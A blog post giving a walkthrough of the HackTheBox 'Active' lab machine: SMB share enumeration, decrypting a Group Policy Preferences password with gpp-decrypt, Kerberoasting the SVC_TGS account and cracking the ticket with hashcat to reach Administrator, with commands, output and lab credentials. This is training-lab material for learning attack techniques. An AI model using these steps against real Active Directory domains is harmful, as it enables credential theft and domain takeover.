---
layout: post
title: "HackTheBox: Active"
description: A writeup for HackTheBox Active
date:   2024-10-03 08:49 +0530
image:  '/images/post/active.jpg'
tags:   [HackTheBox,htb]
---


## Setup
`mkdir -p ~/ctf/HackTheBox/active/scans; cd ~/ctf/HackTheBox/active`
IP Address: 10.10.10.100


`echo "10.10.10.100 active.htb" | sudo tee -a /etc/hosts`
10.10.10.100 active.htb
***
### Enumeration 

`nmap -sC -sV -Pn -p- active.htb -oN scans/nmap -vv`
`nmap -sC -sV -p- -T5 --min-rate 2500 -oN scans/nmap_2 active.htb`
```
# nmap findings

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5722/tcp  open  msdfsr           syn-ack
47001/tcp open  winrm            syn-ack
49152/tcp open  unknown          syn-ack
49153/tcp open  unknown          syn-ack
49154/tcp open  unknown          syn-ack
49155/tcp open  unknown          syn-ack
49157/tcp open  unknown          syn-ack
49158/tcp open  unknown          syn-ack
49165/tcp open  unknown          syn-ack
49166/tcp open  unknown          syn-ack
49168/tcp open  unknown          syn-ack

```

`cme smb active.htb -u '' -p '' --shares`  

```
SMB         active.htb      445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         active.htb      445    DC               [+] active.htb\: 
SMB         active.htb      445    DC               [+] Enumerated shares
SMB         active.htb      445    DC               Share           Permissions     Remark
SMB         active.htb      445    DC               -----           -----------     ------
SMB         active.htb      445    DC               ADMIN$                          Remote Admin
SMB         active.htb      445    DC               C$                              Default share
SMB         active.htb      445    DC               IPC$                            Remote IPC
SMB         active.htb      445    DC               NETLOGON                        Logon server share 
SMB         active.htb      445    DC               Replication     READ            
SMB         active.htb      445    DC               SYSVOL                          Logon server share 
SMB         active.htb      445    DC               Users                           
```

Inside Replication directory, Which looked like SYSVOL backup . we find a XML under  `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\groups` ![cbbba79ad423bd5560d5cddb544b0a2b.png]({{site.baseurl}}/images/post/cbbba79ad423bd5560d5cddb544b0a2b.png)

Using [gpp-decrypt](https://www.hackingarticles.in/credential-dumping-group-policy-preferences-gpp/)
![5e2c4c5cdac10b905e27acf46074c510.png]({{site.baseurl}}/images/post/5e2c4c5cdac10b905e27acf46074c510.png)



```
gpp-decrypt <encrypted cpassword >
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

GPPstillStandingStrong2k18
```

`SVC_TGS:GPPstillStandingStrong2k18`

Using CrackMapExec we see the access for User SVC_TGS
![a5082bd0111660481603c36b3bad0dea.png]({{site.baseurl}}/images/post/a5082bd0111660481603c36b3bad0dea.png)

as SMB We have access to User we can see 
![6fa33424d6b2139303bf0b1e86d85fe3.png]({{site.baseurl}}/images/post/6fa33424d6b2139303bf0b1e86d85fe3.png)

***
# user flag
Location: \SVC_TGS\Desktop\ | Flag: ##################################

***
#### Privilege Escalation
Now as we have TGS service account: we can try Kerboroasting 

![985a997b529dbf101d695bb4813e2a67.png]({{site.baseurl}}/images/post/985a997b529dbf101d695bb4813e2a67.png)

we need resolve the system clock w.r.t to machine clock 

I Found this on medium for this 
![eaeaaed126328b4c2d636e71c1a37e63.png]({{site.baseurl}}/images/post/eaeaaed126328b4c2d636e71c1a37e63.png)

```
 sudo timedatectl set-ntp off 
 sudo rdate -n 10.10.10.100
```

![76ab9017fce1047dce82375134857ce6.png]({{site.baseurl}}/images/post/76ab9017fce1047dce82375134857ce6.png)

`hashcat -m 13100 hashes_kerberoastingg /usr/share/wordlists/rockyou.txt
`
![5cc1b69884eeace5592153006dd26b9d.png]({{site.baseurl}}/images/post/5cc1b69884eeace5592153006dd26b9d.png)
`Administrator:Ticketmaster1968`

using crackmapexec we check privileges and shares 
```
 w3rew01f@w3rew01f  ~/ctf/HackTheBox/active  cme smb active.htb -u 'Administrator' -p 'Ticketmaster1968'           
SMB         active.htb      445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         active.htb      445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
 w3rew01f@w3rew01f  ~/ctf/HackTheBox/active  cme smb active.htb -u 'Administrator' -p 'Ticketmaster1968' --shares
SMB         active.htb      445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         active.htb      445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
SMB         active.htb      445    DC               [+] Enumerated shares
SMB         active.htb      445    DC               Share           Permissions     Remark
SMB         active.htb      445    DC               -----           -----------     ------
SMB         active.htb      445    DC               ADMIN$          READ,WRITE      Remote Admin
SMB         active.htb      445    DC               C$              READ,WRITE      Default share
SMB         active.htb      445    DC               IPC$                            Remote IPC
SMB         active.htb      445    DC               NETLOGON        READ,WRITE      Logon server share 
SMB         active.htb      445    DC               Replication     READ            
SMB         active.htb      445    DC               SYSVOL          READ            Logon server share 
SMB         active.htb      445    DC               Users           READ            

```

using smbclient we get root flag

![d2a35e07513ccdcbee1661bfb3c1f142.png]({{site.baseurl}}/images/post/d2a35e07513ccdcbee1661bfb3c1f142.png)

# root flag
Location: \Users\Administrator\Desktop\ | Flag: 30e625##################################
